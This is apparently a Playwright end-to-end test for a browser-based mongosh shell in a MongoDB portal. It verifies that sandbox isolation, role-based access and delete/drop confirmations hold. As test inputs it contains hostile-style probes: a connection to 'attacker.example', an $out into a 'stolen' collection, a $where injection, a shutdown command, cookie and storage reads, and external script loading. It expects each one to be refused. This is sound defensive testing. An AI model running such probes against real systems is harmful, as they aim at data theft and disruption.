// End-to-end test of the in-browser mongosh shell in a real Chromium.
//
// Verifies that mongosh runs, that its sandbox is isolated (no cookies, no
// network, no access to the portal page), that portal RBAC is enforced, that
// destructive operations require confirmation, and that the portal works
// without any SSO (MongoDB-only sign-in) with RBAC applied to the MongoDB user.
import { chromium } from 'playwright';

const BASE = process.env.BASE ?? 'http://localhost:8080';
const PW = { reader: process.env.READER_PW, writer: process.env.WRITER_PW };
let failures = 0;
const ok = (m) => console.log(`  PASS ${m}`);
const bad = (m) => {
  failures++;
  console.log(`  FAIL ${m}`);
};
const check = (cond, m) => (cond ? ok(m) : bad(m));

const browser = await chromium.launch();

async function session(user, groups, mongoUser, password) {
  // user === null: no SSO at all (MongoDB-only sign-in).
  const ctx = await browser.newContext(user === null ? {} : { extraHTTPHeaders: { 'X-Forwarded-User': user, 'X-Forwarded-Groups': groups } });
  const page = await ctx.newPage();
  page.on('console', (m) => {
    if (m.type() === 'error' || m.type() === 'warning') console.log(`    [console] ${m.text().slice(0, 200)}`);
  });
  await page.goto(`${BASE}/login`);
  await page.fill('#username', mongoUser);
  await page.fill('#password', password);
  await page.click('button[type=submit]');
  await page.waitForURL(`${BASE}/`, { timeout: 30000 });
  await page.goto(`${BASE}/shell?db=app`);
  await page.waitForSelector('text=/mongosh \\d/', { timeout: 120000 });
  return { ctx, page };
}

/** Runs one shell command and returns the text of its entry. */
async function run(page, code) {
  const before = await page.locator('.portal-shell-entry').count();
  await page.fill('#shell-input', code);
  await page.press('#shell-input', 'Enter');
  const entry = page.locator('.portal-shell-entry').nth(before);
  await entry.waitFor();
  await page.waitForFunction((i) => {
    const e = document.querySelectorAll('.portal-shell-entry')[i];
    return e && !e.querySelector('[aria-label="Running"]');
  }, before, { timeout: 60000 });
  return (await entry.innerText()).replace(/\s+/g, ' ');
}

try {
  console.log('== developer (read-only portal role, MongoDB read user)');
  const dev = await session('dana', 'devs', 'reader', PW.reader);
  const p = dev.page;

  let out = await run(p, 'db.orders.find().sort({ n: 1 }).limit(2)');
  check(/ObjectId\(|n\s*:\s*0/.test(out) && out.includes('n'), `find renders BSON documents: ${out.slice(0, 120)}`);

  out = await run(p, 'let total = 0; db.orders.find().forEach(d => { total += d.n }); total');
  check(/\b435\b/.test(out), `JavaScript loop over a cursor (getMore paging): ${out.slice(-40)}`);

  out = await run(p, 'printjson({ a: 1, when: new Date(0) })');
  check(out.includes('1970-01-01'), 'printjson prints BSON types');

  out = await run(p, 'db.orders.aggregate([{ $group: { _id: null, c: { $sum: 1 } } }])');
  check(/c\s*:\s*30/.test(out), `aggregate: ${out.slice(-60)}`);

  out = await run(p, 'show collections');
  check(out.includes('orders'), 'show collections');

  out = await run(p, 'db.orders.insertOne({ x: 1 })');
  check(/read-only|PortalPolicyError/.test(out), `developer write refused: ${out.slice(-100)}`);

  out = await run(p, 'db.orders.aggregate([{ $out: "stolen" }])');
  check(/not permitted|write stage|does not allow/i.test(out), `developer $out refused: ${out.slice(-100)}`);

  out = await run(p, 'db.orders.find({ $where: "sleep(100) || true" }).toArray()');
  check(/JavaScript is not permitted|\$where/.test(out), `$where refused: ${out.slice(-100)}`);

  out = await run(p, 'db.adminCommand({ shutdown: 1 })');
  check(/not permitted/.test(out), `shutdown refused: ${out.slice(-100)}`);

  out = await run(p, 'new Mongo("mongodb://attacker.example:27017")');
  check(/not supported/.test(out), `connecting elsewhere refused: ${out.slice(-100)}`);

  console.log('== sandbox isolation');
  out = await run(p, 'try { document.cookie } catch (e) { "blocked: " + e.name }');
  check(/blocked: (SecurityError|ReferenceError)/.test(out), `document.cookie not readable: ${out.slice(-60)}`);
  out = await run(p, 'try { window.parent.document.title } catch (e) { "blocked: " + e.name }');
  check(/blocked: (SecurityError|ReferenceError)/.test(out), `portal page not accessible: ${out.slice(-60)}`);
  out = await run(p, 'try { localStorage.length } catch (e) { "blocked: " + e.name }');
  check(/blocked: (SecurityError|ReferenceError)/.test(out), `localStorage not accessible: ${out.slice(-60)}`);
  out = await run(p, 'new Promise(res => { try { const r = indexedDB.open("x"); r.onsuccess = () => res("LE" + "AK"); r.onerror = () => res("idb-blocked " + r.error?.name) } catch (e) { res("idb-blocked " + e.name) } })');
  check(/idb-blocked/.test(out) && !/LEAK/.test(out), `IndexedDB not accessible: ${out.slice(-50)}`);
  // Result text after the echoed command (the command itself contains the word LEAK).
  const after = (s) => s.slice(s.lastIndexOf(')') + 1);
  out = await run(p, 'fetch("/api/v1/session").then(r => "LE" + "AK " + r.status, e => "blocked: " + e.name)');
  check(/blocked: TypeError/.test(out) && !/LEAK/.test(out), `network requests from the runtime worker blocked by CSP: ${after(out)}`);
  const xhrSent = await run(p, 'new Promise(res => { try { const x = new XMLHttpRequest(); x.onload = () => res("LE" + "AK " + x.status); x.onerror = () => res("xhr-blocked"); x.open("GET", "/api/v1/session"); x.send() } catch (e) { res("xhr-blocked " + e.name) } })');
  check(/xhr-blocked/.test(xhrSent) && !/LEAK/.test(xhrSent), `XMLHttpRequest blocked: ${after(xhrSent)}`);
  out = await run(p, 'typeof importScripts === "function" ? (() => { try { importScripts("https://example.com/x.js"); return "LE" + "AK" } catch (e) { return "import-blocked " + e.name } })() : "no-importScripts"');
  check(/import-blocked|no-importScripts/.test(out) && !/LEAK/.test(out), `loading external scripts blocked: ${after(out)}`);

  // DevTools evaluation bypasses CSP, so check the delivered policies instead.
  const mainCsp = (await p.request.get(`${BASE}/shell`)).headers()['content-security-policy'] ?? '';
  check(mainCsp.includes("script-src 'self'") && !mainCsp.includes('unsafe-eval'), `main portal page keeps a strict CSP: ${mainCsp.slice(0, 60)}`);
  const sbCsp = (await p.request.get(`${BASE}/shell-sandbox.html`)).headers()['content-security-policy'] ?? '';
  check(sbCsp.includes('sandbox allow-scripts') && sbCsp.includes("connect-src 'none'") && !sbCsp.includes('allow-same-origin'), 'sandbox page CSP: opaque origin, no network');

  await p.fill('#shell-input', 'db.ord');
  await p.press('#shell-input', 'Tab');
  const completed = await p.waitForFunction(() => document.querySelector('#shell-input')?.value === 'db.orders', null, { timeout: 40000 }).then(() => true, () => false);
  check(completed, `Tab completion of collection names (got ${JSON.stringify(await p.inputValue('#shell-input'))})`);
  await p.fill('#shell-input', '');
  await dev.ctx.close();

  console.log('== SRE (portal write role, MongoDB readWrite user)');
  const sre = await session('sam', 'sres', 'writer', PW.writer);
  const q = sre.page;
  out = await run(q, 'db.scratch_e2e.insertMany([{ x: 1 }, { x: 2 }, { x: 3 }])');
  check(out.includes('insertedIds'), `insertMany: ${out.slice(-80)}`);
  out = await run(q, 'db.scratch_e2e.updateOne({ x: 1 }, { $set: { y: true } })');
  check(/modifiedCount\s*:?\s*1/.test(out), `updateOne: ${out.slice(-80)}`);

  // deleteMany asks for confirmation; cancel first, then confirm.
  await q.fill('#shell-input', 'db.scratch_e2e.deleteMany({ x: { $gte: 2 } })');
  await q.press('#shell-input', 'Enter');
  await q.waitForSelector('text=Confirm deleteMany', { timeout: 20000 });
  ok('deleteMany requires confirmation');
  await q.click('button:has-text("Cancel")');
  await q.waitForFunction(() => !document.querySelector('[aria-label="Running"]'));
  out = (await q.locator('.portal-shell-entry').last().innerText()).replace(/\s+/g, ' ');
  check(/cancelled/.test(out), 'cancelled deleteMany is not executed');
  out = await run(q, 'db.scratch_e2e.countDocuments()');
  check(/\b3\b/.test(out.split('countDocuments()')[1] ?? out), 'documents still present after cancel');

  await q.fill('#shell-input', 'db.scratch_e2e.deleteMany({ x: { $gte: 2 } })');
  await q.press('#shell-input', 'Enter');
  await q.waitForSelector('text=Confirm deleteMany');
  await q.click('button:has-text("Run deleteMany")');
  await q.waitForFunction(() => !document.querySelector('[aria-label="Running"]'));
  out = (await q.locator('.portal-shell-entry').last().innerText()).replace(/\s+/g, ' ');
  check(/deletedCount\s*:?\s*2/.test(out), `confirmed deleteMany: ${out.slice(-60)}`);

  // drop requires typing the collection name.
  await q.fill('#shell-input', 'db.scratch_e2e.drop()');
  await q.press('#shell-input', 'Enter');
  await q.waitForSelector('text=Confirm dropCollection');
  check(await q.isDisabled('button:has-text("Run dropCollection")'), 'drop is disabled until the name is typed');
  await q.fill('#shell-confirm-input', 'scratch_e2e');
  await q.click('button:has-text("Run dropCollection")');
  await q.waitForFunction(() => !document.querySelector('[aria-label="Running"]'));
  out = (await q.locator('.portal-shell-entry').last().innerText()).replace(/\s+/g, ' ');
  check(/true/.test(out), `drop after typed confirmation: ${out.slice(-40)}`);

  // Interrupt an infinite loop and keep working.
  await q.fill('#shell-input', 'while (true) {}');
  await q.press('#shell-input', 'Enter');
  await q.waitForTimeout(1500);
  await q.click('button:has-text("Interrupt")');
  await q.waitForSelector('text=/mongosh \\d/', { timeout: 120000 });
  await q.waitForFunction(() => !document.querySelector('#shell-input')?.hasAttribute('disabled'), null, { timeout: 120000 });
  out = await run(q, '1 + 1');
  check(/\b2\b/.test(out.split('1 + 1')[1] ?? ''), 'shell recovers after interrupting an infinite loop');
  await sre.ctx.close();

  console.log('== no SSO: MongoDB-only sign-in, RBAC on the MongoDB user');
  const anon = await browser.newContext();
  const a = await anon.newPage();
  await a.goto(`${BASE}/login`);
  const formShown = await a.waitForSelector('form[aria-label="MongoDB login"]', { timeout: 30000 }).then(() => true, () => false);
  check(formShown, 'login form shown directly when no SSO is used');
  check(!(await a.isVisible('text=Log in with OpenShift')), 'OpenShift login not offered when it is disabled');
  check((await a.locator('.pf-v6-c-alert.pf-m-danger').count()) === 0, 'no error shown for the missing SSO');
  await anon.close();

  const mo = await session(null, '', 'writer', PW.writer);
  const m = mo.page;
  out = await run(m, 'db.mo_e2e.insertOne({ via: "mongodb-only" })');
  check(out.includes('insertedId'), `mapped MongoDB user (role:editor) can write: ${out.slice(-80)}`);
  // role:editor may not drop collections: the server refuses even after the
  // user confirms in the UI.
  await m.fill('#shell-input', 'db.mo_e2e.drop()');
  await m.press('#shell-input', 'Enter');
  await m.waitForSelector('text=Confirm dropCollection', { timeout: 20000 });
  await m.fill('#shell-confirm-input', 'mo_e2e');
  await m.click('button:has-text("Run dropCollection")');
  await m.waitForFunction(() => !document.querySelector('[aria-label="Running"]'));
  out = (await m.locator('.portal-shell-entry').last().innerText()).replace(/\s+/g, ' ');
  check(/does not allow|not permitted/i.test(out), `role:editor cannot drop collections (server-side RBAC): ${out.slice(-100)}`);
  await m.goto(`${BASE}/permissions`);
  await m.waitForSelector('text=My permissions');
  check(await m.isVisible('text=mongodb:writer@admin'), 'permissions page shows the MongoDB identity as RBAC subject');
  check(await m.isVisible('text=role:editor'), 'permissions page shows the mapped role');
  await m.fill('input[aria-label="Object"]', 'app/orders');
  await m.waitForSelector('text=/Allowed by the portal|Denied by the portal/');
  check(await m.isVisible('text=/Allowed by the portal: update documents on app\/orders/'), 'access check evaluates the policy');
  await m.goto(`${BASE}/status`);
  await m.waitForSelector('text=System status');
  check(await m.isVisible('text=Not offered'), 'status page reports OpenShift sign-in as not offered (no error)');
  check(await m.isVisible('text=/Online/'), 'status page shows the MongoDB deployment online');
  await m.goto(`${BASE}/`);
  // The shortcut is registered once the layout has rendered.
  await m.waitForSelector('button[aria-label="Open command palette"]', { timeout: 30000 });
  await m.waitForSelector('text=Databases');
  await m.keyboard.press('Control+k');
  await m.waitForSelector('input[aria-label="Search databases, collections, pages and actions"]', { timeout: 20000 });
  await m.waitForSelector('.portal-palette-item >> text=app');
  await m.keyboard.type('app');
  await m.keyboard.press('Enter');
  await m.waitForURL(`${BASE}/db/app`, { timeout: 10000 }).then(() => ok('command palette navigates to a database'), () => bad(`palette navigation: ${m.url()}`));
  await mo.ctx.close();

  const ro = await session(null, '', 'reader', PW.reader);
  out = await run(ro.page, 'db.orders.insertOne({ x: 1 })');
  // Unmapped users get role:mongodb: the portal defers to MongoDB, which refuses the read-only user's write.
  check(/not authorized|Unauthorized/i.test(out) && !/PortalPolicyError/.test(out), `unmapped MongoDB user follows MongoDB privileges: ${out.slice(-80)}`);
  await ro.page.goto(`${BASE}/monitoring`);
  await ro.page.waitForSelector('text=Data on disk', { timeout: 30000 });
  check(await ro.page.isVisible('text=Topology'), 'monitoring page renders for a user without clusterMonitor');
  check(!(await ro.page.isVisible('.pf-v6-c-alert.pf-m-danger')), 'monitoring degrades without errors');
  await ro.ctx.close();
} catch (e) {
  bad(`unexpected error: ${e.message}`);
} finally {
  await browser.close();
}
console.log(`== e2e result: ${failures === 0 ? 'PASS' : `${failures} failure(s)`}`);
process.exit(failures === 0 ? 0 : 1);
